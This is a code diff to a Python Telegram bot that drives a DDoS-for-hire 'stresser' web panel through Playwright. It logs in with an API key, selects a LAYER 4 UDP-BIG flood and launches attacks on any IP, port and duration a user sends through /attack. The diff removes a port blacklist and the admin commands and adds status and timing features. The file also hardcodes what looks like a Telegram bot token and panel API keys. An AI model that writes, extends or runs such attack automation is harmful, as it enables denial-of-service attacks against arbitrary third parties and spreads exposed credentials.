@@ -2,10 +2,9 @@ import re
 import logging
 import asyncio
 import sqlite3
-import random
 import time
 from datetime import datetime
-from typing import Optional, Tuple, Dict, Any
+from typing import Optional, Tuple, Dict, Any, List
 
 from playwright.async_api import async_playwright, Page, Browser
 from telegram import Update
@@ -13,13 +12,12 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ===== CONFIGURATION =====
 BOT_TOKEN = "8644694135:AAGE9gq1svy3oXjYAYv7aJQas-Tz41C7tA4"
-API_KEY = "85be6181791e4ad1825e97143634b9cb2984830a5c1e4e029a65b395581c8b3b"
+API_KEY = "52a733db30394ab6b01030a8940191b7a15a74796a104edbb1738454c0feac81"
 AUTH_URL = "https://retrostress.st/auth"
 MASTER_USER_ID = 1241657820
-BLACKLISTED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001, 8080, 8086, 8011, 9030}
 
 # ===== BROWSER SELECTION =====
-BROWSER_TYPE = "chromium"
+BROWSER_TYPE = "chromium" #chromium, firefox, webkit
 HEADLESS_MODE = True
 SLOW_MO_MS = 0
 
@@ -79,13 +77,6 @@ def validate_port(port: str) -> Tuple[bool, Optional[str]]:
     port_num = int(port)
     if not (1 <= port_num <= 65535):
         return False, "Port must be between 1-65535."
-    if port_num in BLACKLISTED_PORTS:
-        blocked = ", ".join(str(p) for p in sorted(BLACKLISTED_PORTS))
-        return False, (
-            f"🚫 PORT {port_num} IS BLOCKED\n"
-            f"Valid ports: 1-65535 except: {blocked}\n"
-            "Common ports: 80, 25565, 27015"
-        )
     return True, None
 
 
@@ -125,6 +116,11 @@ class AttackState:
         self.playwright = None
         self.auth_completed = False
         self.last_check = None
+        self.setup_completed = False
+        self.attack_start_time: Optional[float] = None
+        self.attack_duration: Optional[int] = None
+        self.stopped_early: bool = False
+        self.init_messages: List[int] = []  # Track initialization messages to delete
 
 
 state = AttackState()
@@ -287,11 +283,24 @@ async def perform_full_recheck(update: Update = None) -> Dict[str, Any]:
     return results
 
 
+async def delete_init_messages(update: Update) -> None:
+    """Delete all initialization messages"""
+    try:
+        for msg_id in state.init_messages:
+            try:
+                await update.message.chat.delete_message(msg_id)
+            except Exception:
+                pass
+        state.init_messages = []
+    except Exception:
+        pass
+
+
 # ===== AUTHENTICATION + PANEL IN ONE FLOW =====
 async def init_browser_and_panel(update: Update) -> bool:
     global state
     
-    if state.panel_ready and state.page is not None:
+    if state.panel_ready and state.page is not None and state.setup_completed:
         await update.message.reply_text("✅ Panel already ready! Use /attack")
         return True
     
@@ -320,7 +329,10 @@ async def init_browser_and_panel(update: Update) -> bool:
             raise ValueError(f"Unsupported browser: {BROWSER_TYPE}")
         
         state.page = await state.browser.new_page()
-        await update.message.reply_text("🔐 Opening auth page...")
+        
+        # Send and track opening message
+        msg = await update.message.reply_text("🔐 Opening auth page...")
+        state.init_messages.append(msg.message_id)
         
         await state.page.goto(AUTH_URL, timeout=60000)
         await state.page.wait_for_load_state("domcontentloaded", timeout=15000)
@@ -328,7 +340,8 @@ async def init_browser_and_panel(update: Update) -> bool:
         
         auth_success = False
         for auth_attempt in range(3):
-            await update.message.reply_text(f"📝 Entering API key (attempt {auth_attempt+1}/3)...")
+            msg = await update.message.reply_text(f"📝 Entering API key (attempt {auth_attempt+1}/3)...")
+            state.init_messages.append(msg.message_id)
             
             key_filled = await fill_with_retry(state.page, "input#accessKey", API_KEY, retries=3, delay=0.1)
             if not key_filled:
@@ -347,7 +360,8 @@ async def init_browser_and_panel(update: Update) -> bool:
             current_url = state.page.url
             if "auth" not in current_url.lower():
                 auth_success = True
-                await update.message.reply_text("✅ Authentication successful!")
+                msg = await update.message.reply_text("✅ Authentication successful!")
+                state.init_messages.append(msg.message_id)
                 break
             else:
                 await state.page.reload()
@@ -355,9 +369,11 @@ async def init_browser_and_panel(update: Update) -> bool:
         
         if not auth_success:
             await update.message.reply_text("❌ Authentication failed after multiple attempts.")
+            await delete_init_messages(update)
             return False
         
-        await update.message.reply_text("🔘 Looking for START TEST button...")
+        msg = await update.message.reply_text("🔘 Looking for START TEST button...")
+        state.init_messages.append(msg.message_id)
         
         start_clicked = False
         try:
@@ -372,33 +388,48 @@ async def init_browser_and_panel(update: Update) -> bool:
         except Exception:
             start_clicked = True
         
-        await update.message.reply_text("🌐 Waiting for panel to load...")
+        msg = await update.message.reply_text("🌐 Waiting for panel to load...")
+        state.init_messages.append(msg.message_id)
         await state.page.wait_for_load_state("networkidle", timeout=60000)
         
-        await update.message.reply_text("⚙️ Setting up panel (LAYER 4)...")
-        await click_with_retry(state.page, "button:has-text('LAYER 4')", retries=3, delay=0.1)
-        await asyncio.sleep(0.3)
-        
-        ip_sel = "input[placeholder='1.2.3.4 or 1.2.3.0/24']"
-        await fill_with_retry(state.page, ip_sel, "1.2.3.4", retries=3, delay=0.1)
-        
-        port_sel = "input.ct-input.ct-mono[type='number']"
-        await fill_with_retry(state.page, port_sel, "80", retries=3, delay=0.1)
-        
-        await update.message.reply_text("📌 Selecting UDP-BIG method...")
-        if await select_udp_big(state.page, update):
-            await update.message.reply_text("✅ UDP-BIG selected!")
-        else:
-            await update.message.reply_text("⚠️ UDP-BIG selection failed, but panel may still work.")
+        # ONE-TIME SETUP - only runs once
+        if not state.setup_completed:
+            msg = await update.message.reply_text("⚙️ Performing one-time panel setup (LAYER 4, UDP-BIG)...")
+            state.init_messages.append(msg.message_id)
+            
+            await click_with_retry(state.page, "button:has-text('LAYER 4')", retries=3, delay=0.1)
+            await asyncio.sleep(0.3)
+            
+            ip_sel = "input[placeholder='1.2.3.4 or 1.2.3.0/24']"
+            await fill_with_retry(state.page, ip_sel, "1.2.3.4", retries=3, delay=0.1)
+            
+            port_sel = "input.ct-input.ct-mono[type='number']"
+            await fill_with_retry(state.page, port_sel, "80", retries=3, delay=0.1)
+            
+            msg = await update.message.reply_text("📌 Selecting UDP-BIG method...")
+            state.init_messages.append(msg.message_id)
+            if await select_udp_big(state.page, update):
+                msg = await update.message.reply_text("✅ UDP-BIG selected!")
+                state.init_messages.append(msg.message_id)
+            else:
+                msg = await update.message.reply_text("⚠️ UDP-BIG selection failed, but panel may still work.")
+                state.init_messages.append(msg.message_id)
+            
+            state.setup_completed = True
+            msg = await update.message.reply_text("✅ One-time setup complete!")
+            state.init_messages.append(msg.message_id)
         
         state.panel_ready = True
         state.auth_completed = True
         
+        # Delete all initialization messages
+        await delete_init_messages(update)
+        
+        # Send final ready message without browser visibility note
         await update.message.reply_text(
             "✅ PANEL READY!\n"
             "Send: /attack <IP> <PORT> <TIME>\n"
-            "Example: /attack 1.2.3.4 80 60\n"
-            "👁️ Browser is visible - watch the action!"
+            "Example: /attack 1.2.3.4 80 60"
         )
         return True
         
@@ -408,6 +439,7 @@ async def init_browser_and_panel(update: Update) -> bool:
         send_error_to_admin(update.get_bot(), error_msg)
         await update.message.reply_text(f"❌ Initialization failed: {str(e)[:200]}")
         state.panel_ready = False
+        await delete_init_messages(update)
         return False
 
 
@@ -475,7 +507,7 @@ async def find_stop_button(page: Page):
 
 
 # ===== ATTACK LOOP WITH SPEEDED UP FILLING =====
-async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Update) -> str:
+async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Update, message) -> str:
     global state
     
     if not state.panel_ready or state.page is None:
@@ -489,6 +521,9 @@ async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Up
     
     state.running = True
     state.stop_requested = False
+    state.stopped_early = False
+    state.attack_start_time = time.monotonic()
+    state.attack_duration = total_duration
     
     # SET TARGET IP + PORT - SPEEDED UP
     ip_sel = "input.ct-input.ct-mono[type='text'][placeholder*='1.2.3.4']"
@@ -537,20 +572,39 @@ async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Up
         state.running = False
         return "❌ Failed to start attack"
     
+    # Send launch message after 2 seconds
+    launch_text = (
+        f"🚀 Attack Launched!\n"
+        f"╔════════════════════════╗\n"
+        f"║   ⚔️ ATTACK ACTIVE     ║\n"
+        f"╚════════════════════════╝\n\n"
+        f"🎯 Target: {ip}\n"
+        f"🔌 Port: {port}\n"
+        f"⏱️ Duration: {total_duration}s\n\n"
+        f"🔄 Attack is running..."
+    )
+    try:
+        await message.edit_text(launch_text)
+    except Exception:
+        pass
+    
     # --- MAIN LOOP ---
     start_time = time.monotonic()
     total_downtime = 0.0
     restart_interval = 23.0
     next_restart_at = restart_interval
+    completed_naturally = False
     
     while state.running:
         now = time.monotonic()
         active_elapsed = now - start_time - total_downtime
         
         if active_elapsed >= total_duration:
+            completed_naturally = True
             break
         
         if state.stop_requested:
+            state.stopped_early = True
             break
         
         if active_elapsed >= next_restart_at and active_elapsed < total_duration:
@@ -577,51 +631,39 @@ async def launch_attack_fast(ip: str, port: str, total_duration: int, update: Up
         
         await asyncio.sleep(0.1)
     
-    if state.running:
+    if state.running and not state.stopped_early:
         stop_btn = await find_stop_button(state.page)
         if stop_btn:
             await stop_btn.click()
             await asyncio.sleep(0.3)
     
     state.running = False
+    state.attack_start_time = None
+    state.attack_duration = None
+    
+    # Send completion message if attack completed naturally
+    if completed_naturally and not state.stopped_early:
+        complete_text = (
+            f"✅ Attack Completed Successfully!\n"
+            f"╔════════════════════════╗\n"
+            f"║   ✨ SUCCESS           ║\n"
+            f"╚════════════════════════╝\n\n"
+            f"🎯 Target: {ip}:{port}\n"
+            f"⏱️ Duration: {total_duration}s"
+        )
+        try:
+            await message.edit_text(complete_text)
+        except Exception:
+            pass
+    
     return "✅ Attack completed."
 
 
-# ===== PROGRESS UPDATER - REMOVED PROGRESS BAR =====
+# ===== PROGRESS UPDATER =====
 async def progress_updater(update: Update, message, duration: int, attack_type: str, ip: str, port: str) -> None:
-    """Send start message, wait silently, then edit to completion."""
-    # Start message
-    start_text = (
-        f"🚀 Attack Launched!\n"
-        f"╔════════════════════════╗\n"
-        f"║   ⚔️ ATTACK ACTIVE    ║\n"
-        f"╚════════════════════════╝\n\n"
-        f"🎯 Target: {ip}\n"
-        f"🔌 Port: {port}\n"
-        f"⏱ Duration: {duration}s\n\n"
-        f"🔄 Attack is running..."
-    )
-    try:
-        await message.edit_text(start_text)
-    except Exception:
-        pass
-    
-    # Wait silently for attack to complete
-    await asyncio.sleep(duration)
-    
-    # Completion message
-    complete_text = (
-        f"✅ Attack Completed Successfully!\n"
-        f"╔════════════════════════╗\n"
-        f"║   ✨ SUCCESS           ║\n"
-        f"╚════════════════════════╝\n\n"
-        f"🎯 Target: {ip}:{port}\n"
-        f"⏱️ Duration: {duration}s"
-    )
-    try:
-        await message.edit_text(complete_text)
-    except Exception:
-        pass
+    """Wait for attack to complete."""
+    while state.running:
+        await asyncio.sleep(1)
 
 
 # ===== TELEGRAM HANDLERS =====
@@ -650,7 +692,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "║  📝 Use: /attack <ip> <port>      ║\n"
                 "║  📊 /status - Check attacks       ║\n"
                 "║  🔍 /recheck - Verify state       ║\n"
-                "║  👁️ Browser: VISIBLE              ║\n"
                 "╚════════════════════════════════════╝"
             )
         else:
@@ -665,7 +706,6 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "║  📝 Use: /attack <ip> <port> <time>║\n"
         "║  📊 /status - Check attacks       ║\n"
         "║  🔍 /recheck - Verify state       ║\n"
-        "║  👁️ Browser: VISIBLE              ║\n"
         "╚════════════════════════════════════╝"
     )
     
@@ -748,21 +788,17 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     attack_type = "GROUP" if chat.type in ("group", "supergroup") else "PRIVATE"
     
-    state.task = asyncio.create_task(launch_attack_fast(ip, port, duration, update))
+    # Store IP and port for status
+    state.ip = ip
+    state.port = port
     
-    # Send initial message with start format
-    start_text = (
-        f"🚀 Attack Launched!\n"
-        f"╔════════════════════════╗\n"
-        f"║   ⚔️ ATTACK ACTIVE    ║\n"
-        f"╚════════════════════════╝\n\n"
-        f"🎯 Target: {ip}\n"
-        f"🔌 Port: {port}\n"
-        f"⏱ Duration: {duration}s\n\n"
-        f"🔄 Attack is running..."
-    )
-    sent = await update.message.reply_text(start_text)
+    # Send initial message that will be edited after 2 seconds
+    sent = await update.message.reply_text("⏳ Starting attack...")
     
+    # Start attack task
+    state.task = asyncio.create_task(launch_attack_fast(ip, port, duration, update, sent))
+    
+    # Start progress updater to monitor completion
     asyncio.create_task(progress_updater(update, sent, duration, attack_type, ip, port))
 
 
@@ -780,6 +816,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text("🛑 Stopping attack...")
     state.stop_requested = True
+    state.stopped_early = True
     await asyncio.sleep(3)
     
     if state.task and not state.task.done():
@@ -787,6 +824,8 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     state.running = False
     state.stop_requested = False
+    state.attack_start_time = None
+    state.attack_duration = None
     await update.message.reply_text("✅ Attack stopped.")
 
 
@@ -798,18 +837,25 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     log_user_activity(user.id, user.username, user.first_name, user.last_name)
     
-    status = (
-        f"📍 Panel Ready: {'Yes' if state.panel_ready else 'No'}\n"
-        f"📍 Auth Completed: {'Yes' if state.auth_completed else 'No'}\n"
-        f"📍 Page Active: {'Yes' if state.page is not None else 'No'}\n"
-        f"📍 IP: {state.ip or 'Not set'}\n"
-        f"📍 Port: {state.port or 'Not set'}\n"
-        "📌 Method: UDP-BIG\n"
-        f"⚡ Attack running: {'Yes' if state.running else 'No'}\n"
-        f"🔍 Last Check: {state.last_check or 'Never'}\n"
-        "👁️ Browser: VISIBLE (same page auth+panel)"
-    )
-    await update.message.reply_text(status)
+    # Calculate remaining time if attack is running
+    remaining = None
+    if state.running and state.attack_start_time and state.attack_duration:
+        elapsed = time.monotonic() - state.attack_start_time
+        remaining = max(0, int(state.attack_duration - elapsed))
+    
+    status_lines = [
+        "🤖 Bot Running",
+        f"⚡ Status: {'Busy' if state.running else 'Ready to Attack'}",
+        f"🎯 Current Target IP: {state.ip if state.ip else 'N/A'}",
+        f"🔌 Current Port: {state.port if state.port else 'N/A'}"
+    ]
+    
+    if remaining is not None and remaining > 0:
+        status_lines.append(f"⏱️ Remaining Attack Duration: {remaining}s")
+    elif state.running:
+        status_lines.append("⏱️ Remaining Attack Duration: Calculating...")
+    
+    await update.message.reply_text("\n".join(status_lines))
 
 
 async def recheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -887,7 +933,6 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "║  /status - Show current state     ║\n"
         "║  /recheck - Verify full state     ║\n"
         "║  /help - Show this help           ║\n"
-        "║  /admin - Admin panel             ║\n"
         "║  /restart - (Admin) Full restart  ║\n"
         "╠════════════════════════════════════╣\n"
         "║  ⭐ SAME PAGE AUTH + PANEL        ║\n"
@@ -895,208 +940,11 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "║  /attack changes IP/port only     ║\n"
         "║  Example: /attack 1.2.3.4 80 60   ║\n"
         "║  Use /stop to end early           ║\n"
-        "║  👁️ Browser: VISIBLE              ║\n"
         "╚════════════════════════════════════╝"
     )
 
 
-# ===== ADMIN COMMANDS =====
-async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != MASTER_USER_ID:
-        await update.message.reply_text("⛔ Access Denied. Master only.")
-        return
-    
-    cursor.execute("SELECT COUNT(*) FROM groups WHERE approved = 1")
-    total_groups = cursor.fetchone()[0]
-    
-    await update.message.reply_text(
-        "╔════════════════════════════════════╗\n"
-        "║      👑 ADMIN CONTROL PANEL       ║\n"
-        "╠════════════════════════════════════╣\n"
-        f"║  📢 Groups: {total_groups}                   ║\n"
-        f"║  ⚡ Active Attacks: {len(_active_attacks)}              ║\n"
-        f"║  🚫 Blocked Ports: {len(BLACKLISTED_PORTS)}              ║\n"
-        "╠════════════════════════════════════╣\n"
-        "║  📌 COMMANDS:                    ║\n"
-        "║  /approve_group <ID>             ║\n"
-        "║  /disapprove_group <ID>          ║\n"
-        "║  /toggle_trial <ID>              ║\n"
-        "║  /blacklist_ports                ║\n"
-        "║  /users                          ║\n"
-        "║  /banuser <user_id>              ║\n"
-        "║  /unban <user_id>                ║\n"
-        "║  /restart - Full restart         ║\n"
-        "╚════════════════════════════════════╝"
-    )
-
-
-async def approve_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != MASTER_USER_ID:
-        await update.message.reply_text("⛔ Master only.")
-        return
-    if not context.args:
-        await update.message.reply_text("⚠️ Usage: /approve_group <GROUP_ID>")
-        return
-    try:
-        gid = int(context.args[0])
-        cursor.execute(
-            "INSERT OR REPLACE INTO groups (group_id, approved, duration, cooldown, trial_enabled) "
-            "VALUES (?, 1, 120, 100, 1)",
-            (gid,)
-        )
-        conn.commit()
-        await update.message.reply_text(f"✅ Group {gid} approved!")
-    except Exception as e:
-        error_msg = f"Approve group error: {e}"
-        logger.error(error_msg)
-        send_error_to_admin(update.get_bot(), error_msg)
-        await update.message.reply_text("❌ Invalid group ID.")
-
-
-async def disapprove_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != MASTER_USER_ID:
-        await update.message.reply_text("⛔ Master only.")
-        return
-    if not context.args:
-        await update.message.reply_text("⚠️ Usage: /disapprove_group <GROUP_ID>")
-        return
-    try:
-        gid = int(context.args[0])
-        cursor.execute("DELETE FROM groups WHERE group_id = ?", (gid,))
-        conn.commit()
-        await update.message.reply_text(f"✅ Group {gid} removed.")
-    except Exception as e:
-        error_msg = f"Disapprove group error: {e}"
-        logger.error(error_msg)
-        send_error_to_admin(update.get_bot(), error_msg)
-        await update.message.reply_text("❌ Invalid group ID.")
-
-
-async def toggle_trial(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != MASTER_USER_ID:
-        await update.message.reply_text("⛔ Master only.")
-        return
-    if not context.args:
-        await update.message.reply_text("⚠️ Usage: /toggle_trial <GROUP_ID>")
-        return
-    try:
-        gid = int(context.args[0])
-        cursor.execute("SELECT trial_enabled FROM groups WHERE group_id = ?", (gid,))
-        row = cursor.fetchone()
-        if not row:
-            await update.message.reply_text("❌ Group not approved.")
-            return
-        new_val = 0 if row[0] else 1
-        cursor.execute("UPDATE groups SET trial_enabled = ? WHERE group_id = ?", (new_val, gid))
-        conn.commit()
-        await update.message.reply_text(f"✅ Trial {'ENABLED' if new_val else 'DISABLED'} for group {gid}")
-    except Exception as e:
-        error_msg = f"Toggle trial error: {e}"
-        logger.error(error_msg)
-        send_error_to_admin(update.get_bot(), error_msg)
-        await update.message.reply_text("❌ Invalid group ID.")
-
-
-async def blacklist_ports(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != MASTER_USER_ID:
-        await update.message.reply_text("⛔ Master only.")
-        return
-    blocked = ", ".join(str(p) for p in sorted(BLACKLISTED_PORTS))
-    await update.message.reply_text(
-        "╔════════════════════════════════════╗\n"
-        "║      🚫 BLACKLISTED PORTS          ║\n"
-        "╠════════════════════════════════════╣\n"
-        f"║  {blocked} ║\n"
-        "╠════════════════════════════════════╣\n"
-        f"║  Total: {len(BLACKLISTED_PORTS)} ports blocked   ║\n"
-        "╚════════════════════════════════════╝"
-    )
-
-
-async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != MASTER_USER_ID:
-        await update.message.reply_text("⛔ Access Denied. Master only.")
-        return
-    
-    cursor.execute(
-        "SELECT user_id, username, first_name, last_name, last_used "
-        "FROM user_activity ORDER BY last_used DESC"
-    )
-    rows = cursor.fetchall()
-    if not rows:
-        await update.message.reply_text("📊 No users have used the bot yet.")
-        return
-    
-    response = "╔════════════════════════════════════╗\n"
-    response += "║      👥 USER ACTIVITY LIST        ║\n"
-    response += "╠════════════════════════════════════╣\n"
-    for row in rows:
-        uid, username, first, last, last_used = row
-        name = first or ""
-        if last:
-            name += f" {last}"
-        if username:
-            name += f" (@{username})"
-        if not name.strip():
-            name = "Unknown"
-        response += f"║ ID: {uid}\n║ Name: {name[:30]}\n║ Last: {last_used}\n"
-        response += "║────────────────────────────────────║\n"
-    response += "╚════════════════════════════════════╝"
-    
-    if len(response) > 4000:
-        await update.message.reply_text("📊 Too many users. Use /users_full for complete list.")
-    else:
-        await update.message.reply_text(response)
-
-
-async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != MASTER_USER_ID:
-        await update.message.reply_text("⛔ Access Denied. Master only.")
-        return
-    if not context.args:
-        await update.message.reply_text("⚠️ Usage: /banuser <USER_ID>")
-        return
-    try:
-        uid = int(context.args[0])
-        if is_user_banned(uid):
-            await update.message.reply_text(f"ℹ️ User {uid} is already banned.")
-            return
-        cursor.execute("INSERT INTO banned_users (user_id) VALUES (?)", (uid,))
-        conn.commit()
-        await update.message.reply_text(f"✅ User {uid} has been banned.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID. Provide a numeric ID.")
-    except Exception as e:
-        error_msg = f"Ban user error: {e}"
-        logger.error(error_msg)
-        send_error_to_admin(update.get_bot(), error_msg)
-        await update.message.reply_text(f"❌ Error: {str(e)}")
-
-
-async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != MASTER_USER_ID:
-        await update.message.reply_text("⛔ Access Denied. Master only.")
-        return
-    if not context.args:
-        await update.message.reply_text("⚠️ Usage: /unban <USER_ID>")
-        return
-    try:
-        uid = int(context.args[0])
-        if not is_user_banned(uid):
-            await update.message.reply_text(f"ℹ️ User {uid} is not currently banned.")
-            return
-        cursor.execute("DELETE FROM banned_users WHERE user_id = ?", (uid,))
-        conn.commit()
-        await update.message.reply_text(f"✅ User {uid} has been unbanned.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.")
-    except Exception as e:
-        error_msg = f"Unban user error: {e}"
-        logger.error(error_msg)
-        send_error_to_admin(update.get_bot(), error_msg)
-        await update.message.reply_text(f"❌ Error: {str(e)}")
-
-
+# ===== ADMIN COMMANDS - ONLY /restart REMAINS =====
 async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != MASTER_USER_ID:
         await update.message.reply_text("⛔ Access Denied. Master only.")
@@ -1125,12 +973,17 @@ async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     state.panel_ready = False
     state.auth_completed = False
+    state.setup_completed = False
     state.page = None
     state.browser = None
     state.playwright = None
     state.ip = None
     state.port = None
     state.last_check = None
+    state.attack_start_time = None
+    state.attack_duration = None
+    state.stopped_early = False
+    state.init_messages = []
     
     if await init_browser_and_panel(update):
         await update.message.reply_text("✅ Restart completed successfully.")
@@ -1149,14 +1002,7 @@ def main():
     app.add_handler(CommandHandler("recheck", recheck_command))
     app.add_handler(CommandHandler("help", help_command))
     
-    app.add_handler(CommandHandler("admin", admin_command))
-    app.add_handler(CommandHandler("approve_group", approve_group))
-    app.add_handler(CommandHandler("disapprove_group", disapprove_group))
-    app.add_handler(CommandHandler("toggle_trial", toggle_trial))
-    app.add_handler(CommandHandler("blacklist_ports", blacklist_ports))
-    app.add_handler(CommandHandler("users", users_list))
-    app.add_handler(CommandHandler("banuser", ban_user))
-    app.add_handler(CommandHandler("unban", unban_user))
+    # Only admin command remaining
     app.add_handler(CommandHandler("restart", restart_command))
     
     try:
